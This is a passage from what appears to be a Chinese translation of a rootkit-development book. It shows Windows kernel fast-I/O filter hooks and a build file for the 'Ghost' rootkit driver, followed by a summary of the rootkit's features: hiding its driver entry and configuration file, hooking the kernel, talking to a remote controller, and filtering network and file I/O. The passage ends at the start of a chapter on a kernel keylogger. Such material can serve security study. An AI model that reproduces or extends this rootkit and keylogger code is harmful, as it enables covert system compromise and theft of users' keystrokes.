ULONG Key，
OUT PIO_STATUS_BLOCK IoStatus，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_UNLOCK_ALL_BY_KEY );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， FastIoUnlockAllByKey ) )
{
return (fastIoDispatch->FastIoUnlockAllByKey)(
FileObject，
ProcessId，
Key，
IoStatus，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoDeviceControl( IN PFILE_OBJECT FileObject，
IN BOOLEAN Wait，
IN PVOID InputBuffer OPTIONAL，
IN ULONG InputBufferLength，
OUT PVOID OutputBuffer OPTIONAL，
IN ULONG OutputBufferLength，
IN ULONG IoControlCode，
OUT PIO_STATUS_BLOCK IoStatus，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_DEVICE_CONTROL );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， FastIoDeviceControl ) )
{
return (fastIoDispatch->FastIoDeviceControl)( FileObject，
Wait，
InputBuffer，
InputBufferLength，
OutputBuffer，
OutputBufferLength，
IoControlCode，
IoStatus，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoQueryNetworkOpenInfo( IN PFILE_OBJECT FileObject，
IN BOOLEAN Wait，
OUT PFILE_NETWORK_OPEN_INFORMATION Buffer，
OUT PIO_STATUS_BLOCK IoStatus，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_QUERY_NETWORK_OPEN_INFO );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if(
VALID_FAST_IO_DISPATCH_HANDLER(
fastIoDispatch
，
FastIoQueryNetworkOpenInfo )
)
{
return (fastIoDispatch->FastIoQueryNetworkOpenInfo)( FileObject，
Wait，
Buffer，
IoStatus，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoMdlRead( IN PFILE_OBJECT FileObject，
IN PLARGE_INTEGER FileOffset，
IN ULONG Length，
IN ULONG LockKey，
OUT PMDL *MdlChain，
OUT PIO_STATUS_BLOCK IoStatus，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_MDL_READ );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， MdlRead ) )
{
return (fastIoDispatch->MdlRead)( FileObject，
FileOffset，
Length，
LockKey，
MdlChain，
IoStatus，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoMdlReadComplete( IN PFILE_OBJECT FileObject，
IN PMDL MdlChain，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_MDL_READ_COMPLETE );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， MdlReadComplete ) )
{
return (fastIoDispatch->MdlReadComplete)( FileObject，
MdlChain，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoPrepareMdlWrite( IN PFILE_OBJECT FileObject，
IN PLARGE_INTEGER FileOffset，
IN ULONG Length，
IN ULONG LockKey，
OUT PMDL *MdlChain，
OUT PIO_STATUS_BLOCK IoStatus，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_PREPARE_MDL_WRITE );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， PrepareMdlWrite ) )
{
return (fastIoDispatch->PrepareMdlWrite)( FileObject，
FileOffset，
Length，
LockKey，
MdlChain，
IoStatus，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoMdlWriteComplete( IN PFILE_OBJECT FileObject，
IN PLARGE_INTEGER FileOffset，
IN PMDL MdlChain，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_MDL_WRITE_COMPLETE );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， MdlWriteComplete ) )
{
return (fastIoDispatch->MdlWriteComplete)(
FileObject，
FileOffset，
MdlChain，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoReadCompressed( IN PFILE_OBJECT FileObject，
IN PLARGE_INTEGER FileOffset，
IN ULONG Length，
IN ULONG LockKey，
OUT PVOID Buffer，
OUT PMDL *MdlChain，
OUT PIO_STATUS_BLOCK IoStatus，
OUT struct _COMPRESSED_DATA_INFO *CompressedDataInfo，
IN ULONG CompressedDataInfoLength，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_READ_COMPRESSED );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， FastIoReadCompressed ) )
{
return (fastIoDispatch->FastIoReadCompressed)(
FileObject，
FileOffset，
Length，
LockKey，
Buffer，
MdlChain，
IoStatus，
CompressedDataInfo，
CompressedDataInfoLength，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoWriteCompressed( IN PFILE_OBJECT FileObject，
IN PLARGE_INTEGER FileOffset，
IN ULONG Length，
IN ULONG LockKey，
IN PVOID Buffer，
OUT PMDL *MdlChain，
OUT PIO_STATUS_BLOCK IoStatus，
IN struct _COMPRESSED_DATA_INFO *CompressedDataInfo，
IN ULONG CompressedDataInfoLength，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_WRITE_COMPRESSED );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， FastIoReadCompressed ) )
{
return (fastIoDispatch->FastIoWriteCompressed)( FileObject，
FileOffset，
Length，
LockKey，
Buffer，
MdlChain，
IoStatus，
CompressedDataInfo，
CompressedDataInfoLength，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoMdlReadCompleteCompressed( IN PFILE_OBJECT FileObject，
IN PMDL MdlChain，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_MDL_READ_COMPLETE_COMPRESSED );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if(
VALID_FAST_IO_DISPATCH_HANDLER(
fastIoDispatch
，
MdlReadCompleteCompressed ) )
{
return (fastIoDispatch->MdlReadCompleteCompressed)( FileObject，
MdlChain，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoMdlWriteCompleteCompressed( IN PFILE_OBJECT FileObject，
IN PLARGE_INTEGER FileOffset，
IN PMDL MdlChain，
IN PDEVICE_OBJECT DeviceObject )
{
PFAST_IO_DISPATCH
fastIoDispatch;
filterFastIo( FileObject， FALSE， FIO_MDL_WRITE_COMPLETE_COMPRESSED );
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if(
VALID_FAST_IO_DISPATCH_HANDLER(
fastIoDispatch
，
MdlWriteCompleteCompressed ) )
{
return (fastIoDispatch->MdlWriteCompleteCompressed)( FileObject，
FileOffset，
MdlChain，
oldFileSysDevice );
}
return FALSE;
}
BOOLEAN FastIoQueryOpen( IN PIRP Irp，
OUT PFILE_NETWORK_OPEN_INFORMATION NetworkInformation，
IN PDEVICE_OBJECT DeviceObject )
{
BOOLEAN
result;
PIO_STACK_LOCATION
irpStack;
PFAST_IO_DISPATCH
fastIoDispatch;
fastIoDispatch = oldFileSysDevice->DriverObject->FastIoDispatch;
if( VALID_FAST_IO_DISPATCH_HANDLER( fastIoDispatch， FastIoQueryOpen ) )
{
irpStack = IoGetCurrentIrpStackLocation( Irp );
irpStack->DeviceObject = oldFileSysDevice;
result = (fastIoDispatch->FastIoQueryOpen)( Irp，
NetworkInformation，
oldFileSysDevice );
irpStack->DeviceObject = DeviceObject;
return result;
}
return FALSE;
}
void filterFastIo( PFILE_OBJECT file， BOOL cache， int function )
{
// This would be a great place to filter fast file I/O
UNREFERENCED_PARAMETER( file );
UNREFERENCED_PARAMETER( cache );
UNREFERENCED_PARAMETER( function );
return;
}
SOURCES
SOURCES
SOURCES
SOURCES
最后，在 SOURCES 里面添加加了 filterManager.c
：
TARGETNAME=comint32
TARGETPATH=OBJ
TARGETTYPE=DRIVER
SOURCES=Ghost.c\
fileManager.c\
filterManager.c\
IoManager.c\
commManager.c\
hookManager.c\
configManager.c
总结
我们现在拥有了一个具有如下功能的 rootkit：
隐藏设备驱动条目
隐藏配置文件
挂钩操作系统内核
挂钩系统加载进程中指定的进程
响应从用户层程序发来的命令
和远程控制者进行通信
对网络通信进行过滤
对文件系统进行过滤
正如前面几章一样，本章的描述仅仅能让你有一个开始，一旦过滤器已经准备好了，你必须
决定要附加到的目标磁盘和网络协议、要对哪种 I/O 进行控制。
下一章我们会讲一下键盘的记录。任何形式的记录都给 rootkit 的操作增加了相当大的难度。
你要准备好研究怎么在一个DISPATCH_LEVEL的回调函数中进行PASSIVE_LEVEL的操作
问题和线程的同步问题。
笫八章 按键记录
概述
到目前为止,我们所创建的钩子和过滤器所能做的仅仅是一些监视和过滤的工作，在本
章我们会介绍另一项要进行的工作－按键记录。非常不幸的是，文件操作(记录)需要在
passive level 进行.而我们本章创建的键盘记录器可以运行在 dispatch level 上.因为在 dispatch
level 上进行文件操作会导致操作系统崩溃，所以必须要有一个线程，一个存储数据的介质
和一个同步方法来保证正常地操作.。本章包含以下内容：
处理级别
一个键盘记录器
线程与同步
解读按键码
一个实例
测试实例
处理级别
在介绍内核级多线程及其同步的复杂性之前，我们应该先讨论下为什么要进行键盘记
录。本书所实现的 rootkit 是作为一个内核备驱动来实现的，而设备驱动是运行在许多可以
限制它们的功能的处理级别上的，下面描述了设备驱动处理级别和在这些处理级别上调用的
例程：
IRQL = PASSIVE_LEVEL
运行在此级别的例程：DriverEntry，AddDevice， Reinitialize， Unload ，大部分分发函数，
驱动创建的线程和工作线程回调。在这个处理级别上没有屏蔽任何中断。
IRQL = APC_LEVEL